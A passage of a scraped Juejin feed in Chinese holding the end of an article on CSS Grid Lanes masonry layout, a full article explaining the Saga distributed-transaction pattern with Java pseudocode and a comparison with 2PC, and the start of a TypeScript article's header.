<p>如果你想要反方向的砖块布局，使用 <code>grid-template-rows</code>：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
  <span class="hljs-attribute">display</span>: grid-lanes;
  <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}
</code></pre>
<h2 data-id="heading-7">容差</h2>
<p>“容差”是为 Grid Lanes 创建的一个新概念。它允许你调整布局算法在决定放置项目位置时的精确度。</p>
<p>回到高速公路的比喻：</p>
<p>假设 1 号车道前面的车比 2 号车道长了 1 厘米，下一辆车要排到哪条车道？</p>
<p>如果严格按“哪条短选哪条”，它会选 2 号车道。但 1 厘米的差距根本不重要！这样来回切换车道反而让人困惑。</p>
<p><strong>“容差”就是告诉系统：“差距小于这个值，就当作一样长”。</strong></p>
<p>容差默认值是 1em（大约一个字的高度）。</p>
<p>为什么容差很重要呢？</p>
<p><strong>因为用键盘 Tab 键浏览网页的人（比如视障用户）会按内容顺序跳转。</strong></p>
<p>如果布局乱跳，他们会很迷惑。合适的容差能让浏览体验更流畅。</p>
<h2 data-id="heading-8">现在能用吗？</h2>
<p>目前可以在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Fsafari%2Fresources%2F" target="_blank" title="https://developer.apple.com/safari/resources/" ref="nofollow noopener noreferrer">Safari 技术预览版 234</a> 中体验，其他浏览器还在开发中。</p>
<p>苹果 WebKit 团队从 2022 年中就开始实现这个功能，现在基本语法已经稳定了。虽然还有些细节在讨论（比如属性命名），但核心用法不会变。</p>
<p>你可以访问 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwebkit.org%2Fdemos%2Fgrid3%2F" target="_blank" title="https://webkit.org/demos/grid3/" ref="nofollow noopener noreferrer">webkit.org/demos/grid3</a> 看各种实际例子。</p>
<h2 data-id="heading-9">最后</h2>
<p>欢迎围观我的“<a href="https://link.juejin.cn?target=https%3A%2F%2Fyayujs.com%2F" target="_blank" title="https://yayujs.com/" ref="nofollow noopener noreferrer">网页版朋友圈</a>”，关注我的公众号：<strong>冴羽（或搜索 yayujs）</strong>，每天分享前端知识、AI 干货。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Saga 分布式事务模式详解]]></title>    <link>https://juejin.cn/post/7592765004807946291</link>    <guid>https://juejin.cn/post/7592765004807946291</guid>    <pubDate>2026-01-08T09:40:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592765004807946291" data-draft-id="7592816646870122505" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Saga 分布式事务模式详解"/> <meta itemprop="keywords" content="架构"/> <meta itemprop="datePublished" content="2026-01-08T09:40:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="狼爷"/> <meta itemprop="url" content="https://juejin.cn/user/2418581314208279"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Saga 分布式事务模式详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2418581314208279/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    狼爷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:40:55.000Z" title="Thu Jan 08 2026 09:40:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="srcery">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1b19;color:#fce8c3}.hljs-emphasis,.hljs-strong{color:#918175}.hljs-bullet,.hljs-link,.hljs-literal,.hljs-number,.hljs-quote,.hljs-regexp{color:#ff5c8f}.hljs-code,.hljs-selector-class{color:#68a8e4}.hljs-emphasis{font-style:italic}.hljs-attribute,.hljs-keyword,.hljs-section,.hljs-selector-tag,.hljs-variable{color:#ef2f27}.hljs-name,.hljs-title{color:#fbb829}.hljs-params,.hljs-type{color:#0aaeb3}.hljs-string{color:#98bc37}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-selector-attr,.hljs-selector-id,.hljs-selector-pseudo,.hljs-subst,.hljs-symbol,.hljs-template-tag,.hljs-template-variable{color:#c07abe}.hljs-comment,.hljs-deletion,.hljs-meta{color:#918175}</style><blockquote>
<p>先喝口水，再看一眼分布式系统，然后你会发现：<strong>没有事务，心里没底；有了事务，系统要命。</strong></p>
</blockquote>
<p>作为一名写了很多年 Java 的老兵，今天我们来聊一个在微服务世界里<strong>既不完美、但很实用</strong>的方案——<strong>Saga 分布式事务模式</strong>。</p>
<hr/>
<h2 data-id="heading-0">一、为什么需要 Saga？（问题从哪来）</h2>
<p>在单体应用里，事务是这样的：</p>
<pre><code class="hljs language-text" lang="text">BEGIN
  A 表扣钱
  B 表加库存
  C 表创建订单
COMMIT / ROLLBACK
</code></pre>
<p>一切都很美，直到：</p>
<ul>
<li>服务被拆成了 <strong>微服务</strong></li>
<li>数据库被拆成了 <strong>多个库</strong></li>
<li>本地事务失效了</li>
</ul>
<p>你会发现：</p>
<blockquote>
<p><strong>分布式系统里，没有一个“全局数据库事务”在等你。</strong></p>
</blockquote>
<h3 data-id="heading-1">传统方案的问题</h3>
<ul>
<li>
<p><strong>2PC / XA</strong>：</p>
<ul>
<li>强一致</li>
<li>强依赖</li>
<li>强性能杀手</li>
</ul>
</li>
</ul>
<p>于是我们开始思考：</p>
<blockquote>
<p>能不能<strong>不要强一致</strong>，但系统还能跑？</p>
</blockquote>
<p>答案就是：<strong>Saga</strong>。</p>
<hr/>
<h2 data-id="heading-2">二、Saga 是什么？（一句话版本）</h2>
<blockquote>
<p><strong>Saga = 一连串本地事务 + 对应的补偿事务</strong></p>
</blockquote>
<p>换句话说：</p>
<ul>
<li>每一步都 <strong>先提交</strong></li>
<li>如果后面失败了</li>
<li>就 <strong>按相反顺序补偿回去</strong></li>
</ul>
<p>听起来是不是有点像：</p>
<blockquote>
<p>“做错了事，靠后悔药解决。”</p>
</blockquote>
<p>没错，但这药在分布式系统里，<strong>很值钱</strong>。</p>
<hr/>
<h2 data-id="heading-3">三、Saga 的核心思想（重要但不复杂）</h2>
<h3 data-id="heading-4">1️⃣ 本地事务优先</h3>
<p>每个服务：</p>
<ul>
<li>只操作 <strong>自己的数据库</strong></li>
<li>使用 <strong>本地事务</strong>（Spring @Transactional 那套）</li>
</ul>
<h3 data-id="heading-5">2️⃣ 失败 ≠ 回滚</h3>
<p>Saga 的世界里：</p>
<ul>
<li><strong>失败不是 rollback</strong></li>
<li>而是：</li>
</ul>
<blockquote>
<p><strong>执行补偿操作（Compensation Action）</strong></p>
</blockquote>
<h3 data-id="heading-6">3️⃣ 最终一致性</h3>
<ul>
<li>中间状态可能不一致</li>
<li>但最终能“对上账”</li>
</ul>
<p>一句话总结：</p>
<blockquote>
<p><strong>Saga 不保证你时时开心，但保证你最后不崩。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-7">四、Saga 的两种经典实现方式</h2>
<h3 data-id="heading-8">方式一：编排式 Saga（Orchestration）⭐ 推荐</h3>
<p>有一个<strong>指挥官</strong>，统一调度流程。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant SagaCoordinator
    participant OrderService
    participant PaymentService
    participant InventoryService

    SagaCoordinator-&gt;&gt;OrderService: 创建订单
    SagaCoordinator-&gt;&gt;PaymentService: 扣款
    SagaCoordinator-&gt;&gt;InventoryService: 扣库存

    InventoryService--&gt;&gt;SagaCoordinator: 失败
    SagaCoordinator-&gt;&gt;PaymentService: 退款（补偿）
    SagaCoordinator-&gt;&gt;OrderService: 取消订单（补偿）
</code></pre>
<p><strong>优点</strong>：</p>
<ul>
<li>流程清晰</li>
<li>易于监控</li>
<li>逻辑集中</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>指挥官可能变胖</li>
</ul>
<blockquote>
<p>但对 Java 后端来说，这个“胖”是可以接受的。</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">方式二：编舞式 Saga（Choreography）</h3>
<p>没有指挥官，全靠服务自己“看消息办事”。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
  Order --&gt;|事件| Payment
  Payment --&gt;|事件| Inventory
  Inventory --&gt;|失败事件| Payment
  Payment --&gt;|补偿事件| Order
</code></pre>
<p><strong>优点</strong>：</p>
<ul>
<li>去中心化</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>链路难追踪</li>
<li>Debug 靠信仰</li>
</ul>
<blockquote>
<p><strong>一旦系统大了，没人知道谁在跳哪支舞。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-10">五、一个下单场景的 Saga 示例（Java 思路）</h2>
<h3 data-id="heading-11">正向流程</h3>
<ol>
<li>创建订单（Order Service）</li>
<li>扣减余额（Payment Service）</li>
<li>扣减库存（Inventory Service）</li>
</ol>
<h3 data-id="heading-12">补偿流程</h3>
<ul>
<li>库存失败 → 退款 → 取消订单</li>
</ul>
<h3 data-id="heading-13">伪代码示例（编排式）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrderSaga</span><span class="hljs-params">(CreateOrderCmd cmd)</span> {
    <span class="hljs-keyword">try</span> {
        orderService.create(cmd);
        paymentService.pay(cmd);
        inventoryService.deduct(cmd);
    } <span class="hljs-keyword">catch</span> (Exception e) {
        inventoryService.compensate(cmd);
        paymentService.refund(cmd);
        orderService.cancel(cmd);
        <span class="hljs-keyword">throw</span> e;
    }
}
</code></pre>
<blockquote>
<p>看起来很普通，对吧？</p>
<p><strong>但它解决的是分布式事务这个“世纪难题”。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-14">六、Saga 的几个关键设计点（血泪经验）</h2>
<h3 data-id="heading-15">1️⃣ 补偿必须是幂等的</h3>
<ul>
<li>可能被调用多次</li>
<li>不能多退钱、多加库存</li>
</ul>
<blockquote>
<p><strong>幂等不是优化，是底线。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-16">2️⃣ 补偿 ≠ 完全回滚</h3>
<ul>
<li>有些操作不可逆（比如发短信）</li>
<li>补偿只能“业务上对等”</li>
</ul>
<blockquote>
<p>分布式系统里，
<strong>时间不能倒流，只能对冲。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-17">3️⃣ 一定要有状态表</h3>
<ul>
<li>Saga 实例状态</li>
<li>当前执行到哪一步</li>
<li>是否已补偿</li>
</ul>
<p>否则：</p>
<blockquote>
<p>系统一重启，你会失忆。</p>
</blockquote>
<hr/>
<h2 data-id="heading-18">七、Saga vs 2PC（快速对比）</h2>



































<table><thead><tr><th>维度</th><th>Saga</th><th>2PC</th></tr></thead><tbody><tr><td>一致性</td><td>最终一致</td><td>强一致</td></tr><tr><td>性能</td><td>高</td><td>低</td></tr><tr><td>实现复杂度</td><td>中</td><td>高</td></tr><tr><td>可用性</td><td>高</td><td>低</td></tr><tr><td>微服务友好度</td><td>⭐⭐⭐⭐⭐</td><td>⭐</td></tr></tbody></table>
<p>结论一句话：</p>
<blockquote>
<p><strong>微服务时代，用 Saga；银行核心，用 2PC。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-19">八、Java 技术栈中的 Saga 实践</h2>
<p>常见组合：</p>
<ul>
<li>Spring Boot</li>
<li>Spring Transaction</li>
<li>消息队列（Kafka / RocketMQ）</li>
<li>状态表 + 定时补偿</li>
</ul>
<p>进阶框架：</p>
<ul>
<li>Axon</li>
<li>Eventuate Tram</li>
<li>自研 Saga Coordinator（很多公司最终都会走这条路）</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TypeScript 在项目中的实际解决的问题]]></title>    <link>https://juejin.cn/post/7592759140038180905</link>    <guid>https://juejin.cn/post/7592759140038180905</guid>    <pubDate>2026-01-08T09:29:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759140038180905" data-draft-id="7592789801708863529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TypeScript 在项目中的实际解决的问题"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-08T09:29:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="戴维南"/> <meta itemprop="url" content="https://juejin.cn/user/4336129588332413"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TypeScript 在项目中的实际解决的问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4336129588332413/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    戴维南
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:29:32.000Z" title="Thu Jan 08 2026 09:29:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
